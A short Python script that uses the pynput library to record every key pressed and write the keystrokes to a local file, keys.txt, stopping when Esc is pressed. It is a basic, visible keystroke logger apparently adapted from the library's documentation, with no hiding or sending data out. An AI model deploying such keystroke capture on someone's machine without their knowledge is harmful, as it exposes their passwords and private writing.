from pynput import keyboard

keys = []

def strip_apostrophe(key):
    return str(key).replace("'", "")

def format_key(key):
    return strip_apostrophe(key) + " "

def write_to_file(keys):
    with open('keys.txt', 'w') as file:
        for key in keys:
            file.write(format_key(key))

# Boilerplate from pynput docs
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
def on_press(key):
    keys.append(key)
    write_to_file(keys)

    # try:
    #     print('alphanumeric key {0} pressed'.format(key.char))
    # except AttributeError:
    #     print('special key {0} pressed'.format(key))

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:    
    listener.join()